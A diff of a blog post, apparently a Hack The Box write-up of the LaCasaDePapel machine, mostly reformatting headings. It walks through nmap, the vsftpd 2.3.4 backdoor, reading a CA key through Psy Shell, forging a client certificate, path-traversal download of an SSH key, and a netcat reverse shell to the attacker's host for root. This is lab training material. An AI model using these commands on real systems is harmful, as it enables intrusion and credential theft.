@@ -2,21 +2,22 @@
 layout: post
 title: Hack The Box - LaCasaDePapel
 categories: hack-the-box
-tags: [Linux, Web, ssh, php]
+tags: [linux, web, ssh, php]
+description: My write-up for LaCasaDePapel from Hack The Box.
 image: /hackthebox/lacasadepapel/0.png
 ---
 
 <hr>
-### Quick Summary
-#### Hey guys today LaCasaDePapel retired and here's my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It's a Linux box and its ip is `10.10.10.131`, I added it to `/etc/hosts` as `lacasadepapel.htb`. Let's jump right in !
+## Quick Summary
+<br> Hey guys today LaCasaDePapel retired and here's my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It's a Linux box and its ip is `10.10.10.131`, I added it to `/etc/hosts` as `lacasadepapel.htb`. Let's jump right in !
 ![](/images/hackthebox/lacasadepapel/0.png)
 <hr>
-### Nmap
-#### As always we will start with `nmap` to scan for open ports and services :
+## Nmap
+<br> As always we will start with `nmap` to scan for open ports and services :
 `nmap -sV -sT -sC lacasadepapel.htb`
 ![](/images/hackthebox/lacasadepapel/1.png)
-#### We have `http` on port 80. `https` on port 443, `ftp` on port 21 and `ssh` on port 22.
-#### Anonymous authentication wasn't allowed on `ftp` so I checked `http` and `https` :
+<br> We have `http` on port 80. `https` on port 443, `ftp` on port 21 and `ssh` on port 22.
+<br> Anonymous authentication wasn't allowed on `ftp` so I checked `http` and `https` :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb
 Connected to lacasadepapel.htb.
@@ -30,21 +31,21 @@ ftp>
 ```
 <br>
 <hr>
-### HTTP
+## HTTP
 `http://lacasadepapel.htb`
 ![](/images/hackthebox/lacasadepapel/2.png)
-#### We see an image of the characters from [LaCasaDePapel](https://www.imdb.com/title/tt6468322/) (TV show) and a QR code for `OTP`, I scanned it with [Google Authenticator](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&hl=en) on my phone :
+<br> We see an image of the characters from [LaCasaDePapel](https://www.imdb.com/title/tt6468322/) (TV show) and a QR code for `OTP`, I scanned it with [Google Authenticator](https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2&hl=en) on my phone :
 ![](/images/hackthebox/lacasadepapel/3.png)
-#### As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the `OTP` and used `test@test.com` as email :
+<br> As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the `OTP` and used `test@test.com` as email :
 ![](/images/hackthebox/lacasadepapel/4.png)
-#### Then nothing happened, I just got the same page back again. I tried `gobuster` to see if I can find any sub directories and I didn't get anything useful. Let's check `https`.
+<br> Then nothing happened, I just got the same page back again. I tried `gobuster` to see if I can find any sub directories and I didn't get anything useful. Let's check `https`.
 `https://lacasadepapel.htb`
 ![](/images/hackthebox/lacasadepapel/5.png)
-#### The same background with an error message saying : "Sorry, but you need to provide a client certificate to continue."
+<br> The same background with an error message saying : "Sorry, but you need to provide a client certificate to continue."
 <br>
 <hr>
-### vsftpd 2.3.4, Psy Shell
-#### After hitting dead ends with web, I checked the `ftp` service again, the version was `vsftpd 2.3.4` (from the `nmap` scan) so I searched for exploits :
+## vsftpd 2.3.4, Psy Shell
+<br> After hitting dead ends with web, I checked the `ftp` service again, the version was `vsftpd 2.3.4` (from the `nmap` scan) so I searched for exploits :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
@@ -55,7 +56,7 @@ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                          
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result
 ```
-#### Command Execution and there is a `metasploit` module for it, but the exploit didn't work :
+<br> Command Execution and there is a `metasploit` module for it, but the exploit didn't work :
 ```
 msf5 > search vsftpd 2.3.4
 
@@ -99,22 +100,22 @@ msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [*] Exploit completed, but no session was created.
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) > 
 ```
-#### Apparently there was another service running on port 6200, a quick `nmap` scan shows that the port is open :
+<br> Apparently there was another service running on port 6200, a quick `nmap` scan shows that the port is open :
 ![](/images/hackthebox/lacasadepapel/6.png)
-#### So I connected to that port with `nc` to see what's there :
+<br> So I connected to that port with `nc` to see what's there :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel# nc lacasadepapel.htb 6200
 Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
 ```
-#### The banner says `Psy Shell v0.9.9`, I didn't know what `Psy Shell` was but a quick search and I found the [website](https://psysh.org/). It's a shell used for interactive `php` debugging and we can use it to execute `php`. 
-#### I tried to execute system commands but I couldn't :
+<br> The banner says `Psy Shell v0.9.9`, I didn't know what `Psy Shell` was but a quick search and I found the [website](https://psysh.org/). It's a shell used for interactive `php` debugging and we can use it to execute `php`. 
+<br> I tried to execute system commands but I couldn't :
 ```
 exec("whoami")
 PHP Fatal error:  Call to undefined function exec() in Psy Shell code on line 1
 system("whoami")
 PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
 ```
-#### I tried to use `scandir()` to see the current directory listing and it worked :
+<br> I tried to use `scandir()` to see the current directory listing and it worked :
 ```
 scandir(".")
 => [
@@ -144,7 +145,7 @@ scandir(".")
 	 "var",                           
    ]
 ```
-#### I could list the directories in `/home` :
+<br> I could list the directories in `/home` :
 ```
 scandir("home/")
 => [
@@ -157,8 +158,8 @@ scandir("home/")
      "professor",
    ]
 ```
-#### Now we know the users on the box : `berlin`,`dali`,`nairobi`,`oslo` and `professor`.
-#### I found the user flag in `/home/berlin`, however I got permission denied when I tried to read it :
+<br> Now we know the users on the box : `berlin`,`dali`,`nairobi`,`oslo` and `professor`.
+<br> I found the user flag in `/home/berlin`, however I got permission denied when I tried to read it :
 ```
 scandir("home/berlin")
 => [
@@ -174,7 +175,7 @@ scandir("home/berlin")
 readfile("home/berlin/user.txt")
 PHP Warning:  readfile(home/berlin/user.txt): failed to open stream: Permission denied in phar://eval()'d code on line 1
 ```
-#### Same for `.ssh`, after a lot of failed attempts to get `RCE`, I looked at the `help` menu to see if there's anything helpful:
+<br> Same for `.ssh`, after a lot of failed attempts to get `RCE`, I looked at the `help` menu to see if there's anything helpful:
 ```
 help
   help       Show a list of commands. Type `help [foo]` for information about [foo].                                Aliases: ?  
@@ -194,12 +195,12 @@ help
   history    Show the Psy Shell history.                                                                            Aliases: hist
   exit       End the current session and return to caller.                                                          Aliases: quit, q
 ```
-#### I used `ls` to see what variables are there :
+<br> I used `ls` to see what variables are there :
 ```
 ls
 Variables: $tokyo
 ```
-#### There was only one variable called `tokyo` , let's check that variable:
+<br> There was only one variable called `tokyo` , let's check that variable:
 ```
 show $tokyo
   > 2| class Tokyo {
@@ -211,7 +212,7 @@ show $tokyo
     8|  }
     9| }
 ```
-#### The function `sign()` is using the private key `/home/nairobi/ca.key`, we can grab that key and create a client certificate to access the `https` service we couldn't access before. 
+<br> The function `sign()` is using the private key `/home/nairobi/ca.key`, we can grab that key and create a client certificate to access the `https` service we couldn't access before. 
 ```
 file_get_contents('/home/nairobi/ca.key');
 => """
@@ -247,8 +248,8 @@ file_get_contents('/home/nairobi/ca.key');
 ```
 <br>
 <hr>
-### Client Certificate Generation
-#### First, we will create a certificate signing request (`CSR`) :
+## Client Certificate Generation
+<br> First, we will create a certificate signing request (`CSR`) :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# cat ca.key
 -----BEGIN PRIVATE KEY-----
@@ -300,21 +301,21 @@ to be sent with your certificate request
 A challenge password []:
 An optional company name []:
 ```
-#### Then we will use it to generate the certificate :
+<br> Then we will use it to generate the certificate :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt                                                                                      
 Signature ok
 subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd, CN = lacasadepapel.htb
 Getting Private key
 ```
-#### And finally we will create a `PKCS12` certificate :
+<br> And finally we will create a `PKCS12` certificate :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
 Enter Export Password:
 Verifying - Enter Export Password:
 root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert# 
 ```
-#### Now we can import it to Firefox :
+<br> Now we can import it to Firefox :
 ![](/images/hackthebox/lacasadepapel/7.png)
 <br>
 <br>
@@ -322,41 +323,41 @@ root@kali:~/Desktop/HTB/boxes/lacasadepapel/cert#
 <br>
 <br>
 ![](/images/hackthebox/lacasadepapel/9.png)
-#### We have to Remove the `ssl` exception we gave earlier to `https://lacasadepapel.htb`, then we will visit it again and it will request our client certificate :
+<br> We have to Remove the `ssl` exception we gave earlier to `https://lacasadepapel.htb`, then we will visit it again and it will request our client certificate :
 ![](/images/hackthebox/lacasadepapel/10.png)
 <br>
 <br>
 ![](/images/hackthebox/lacasadepapel/11.png)
 <hr>
-### Path Traversal, Arbitrary File Download, User Flag
-#### After gaining access we have an option to choose season 1 or season 2, clicking on one of them will take us to a page to download episodes :
+## Path Traversal, Arbitrary File Download, User Flag
+<br> After gaining access we have an option to choose season 1 or season 2, clicking on one of them will take us to a page to download episodes :
 ![](/images/hackthebox/lacasadepapel/12.png)
-#### As you can see in the `url` there is a get parameter called `path`, which means that the `php` script reads files from a given path and lists them (in this case directory : `SEASON-1`). If that parameter doesn't get filtered correctly it can cause a path traversal vulnerability allowing us to list files in other directories. However listing files doesn't help us in any way, we already can do that with `Psy Shell`. But if we try to download an episode, `01.avi` for example :
+<br> As you can see in the `url` there is a get parameter called `path`, which means that the `php` script reads files from a given path and lists them (in this case directory : `SEASON-1`). If that parameter doesn't get filtered correctly it can cause a path traversal vulnerability allowing us to list files in other directories. However listing files doesn't help us in any way, we already can do that with `Psy Shell`. But if we try to download an episode, `01.avi` for example :
 ![](/images/hackthebox/lacasadepapel/13.png) 
-#### The download link will be : `https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp`
-#### Decoding that base-64 string we get this :
+<br> The download link will be : `https://lacasadepapel.htb/file/U0VBU09OLTEvMDEuYXZp`
+<br> Decoding that base-64 string we get this :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo U0VBU09OLTEvMDEuYXZp | base64 -d 
 SEASON-1/01.aviroot@kali:~/Desktop/HTB/boxes/lacasadepapel# 
 ```
-#### It uses the path to request files, let's see where are we first :
+<br> It uses the path to request files, let's see where are we first :
 `https://lacasadepapel/?path=../`
 ![](/images/hackthebox/lacasadepapel/14.png)
-#### We are in `berlin`'s home directory (Because the user flag is there).
+<br> We are in `berlin`'s home directory (Because the user flag is there).
 `https://lacasadepapel/?path=../.ssh/`
 ![](/images/hackthebox/lacasadepapel/15.png)
-#### Let's download `id_rsa`, we know that the path is `../.ssh/id_rsa` :
+<br> Let's download `id_rsa`, we know that the path is `../.ssh/id_rsa` :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n "../.ssh/id_rsa" | base64
 Li4vLnNzaC9pZF9yc2E=
 root@kali:~/Desktop/HTB/boxes/lacasadepapel# 
 ```
-#### `-n` for no new lines.
+<br> `-n` for no new lines.
 `https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=`
 ![](/images/hackthebox/lacasadepapel/16.png)
-#### We found the key in `berlin`'s home directory, however I couldn't get `ssh` as `berlin`, I tried other users and `professor` worked :
+<br> We found the key in `berlin`'s home directory, however I couldn't get `ssh` as `berlin`, I tried other users and `professor` worked :
 ![](/images/hackthebox/lacasadepapel/17.png)
-#### I couldn't read the flag as `professor`, so I downloaded it like I downloaded the `ssh` key :
+<br> I couldn't read the flag as `professor`, so I downloaded it like I downloaded the `ssh` key :
 ```
 root@kali:~/Desktop/HTB/boxes/lacasadepapel# echo -n "../user.txt" | base64
 Li4vdXNlci50eHQ=
@@ -367,10 +368,10 @@ root@kali:~/Desktop/HTB/boxes/lacasadepapel#
 <br>
 <br>
 ![](/images/hackthebox/lacasadepapel/19.png)
-#### We owned user.
+<br> We owned user.
 <hr>
-### Privilege Escalation, Root Flag
-#### In the home directory of `professor` there are 2 interesting files : `memcached.ini` and `memcached.js` :
+## Privilege Escalation, Root Flag
+<br> In the home directory of `professor` there are 2 interesting files : `memcached.ini` and `memcached.js` :
 ```
 lacasadepapel [~]$ ls -la
 total 24
@@ -383,7 +384,7 @@ drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
 drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
 lacasadepapel [~]$ 
 ```
-#### We can't read `memcached.js` but we can read `memecached.ini`, we can't write to both. 
+<br> We can't read `memcached.js` but we can read `memecached.ini`, we can't write to both. 
 ```
 lacasadepapel [~]$ cat memcached.js 
 cat: can't open 'memcached.js': Permission denied
@@ -392,15 +393,15 @@ lacasadepapel [~]$ cat memcached.ini
 command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
 lacasadepapel [~]$ 
 ```
-#### `memcached.ini` is executing this command : `/usr/bin/node /home/professor/memcached.js` as `nobody` by using `sudo`. Most likely it will be running as root, I ran `pspy` and saw that the command gets executed periodically :
+<br> `memcached.ini` is executing this command : `/usr/bin/node /home/professor/memcached.js` as `nobody` by using `sudo`. Most likely it will be running as root, I ran `pspy` and saw that the command gets executed periodically :
 ![](/images/hackthebox/lacasadepapel/20.png)
-#### The `uid` is 65534 which is the `uid` of `nobody` :
+<br> The `uid` is 65534 which is the `uid` of `nobody` :
 ```
 lacasadepapel [~]$ id nobody
 uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
 lacasadepapel [~]$ 
 ```
-#### We can't write to `memcached.ini`, but we can delete it and create a new one :
+<br> We can't write to `memcached.ini`, but we can delete it and create a new one :
 ```
 lacasadepapel [~]$ cat memcached.ini
 [program:memcached]
@@ -413,14 +414,14 @@ lacasadepapel [~]$ cat memcached.ini
 command = /usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash
 lacasadepapel [~]$
 ```
-#### I changed the command from `sudo -u nobody /usr/bin/node /home/professor/memcached.js` to `/usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash`. After some seconds I got a reverse shell as root :
+<br> I changed the command from `sudo -u nobody /usr/bin/node /home/professor/memcached.js` to `/usr/bin/nc 10.10.xx.xx 1337 -e /bin/bash`. After some seconds I got a reverse shell as root :
 ![](/images/hackthebox/lacasadepapel/21.png)
-#### And we owned root !
-#### That's it , Feedback is appreciated !
-#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
-#### Thanks for reading.
+<br> And we owned root !
+<br> That's it , Feedback is appreciated !
+<br> Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
+<br> Thanks for reading.
 <br>
 <br>
-#### Previous Hack The Box write-up : [Hack The Box - CTF](/hack-the-box/ctf/)
-#### Next Hack The Box write-up : [Hack The Box - Fortune](/hack-the-box/fortune/)
+<br> Previous Hack The Box write-up : [Hack The Box - CTF](/hack-the-box/ctf/)
+<br> Next Hack The Box write-up : [Hack The Box - Fortune](/hack-the-box/fortune/)
 <hr>
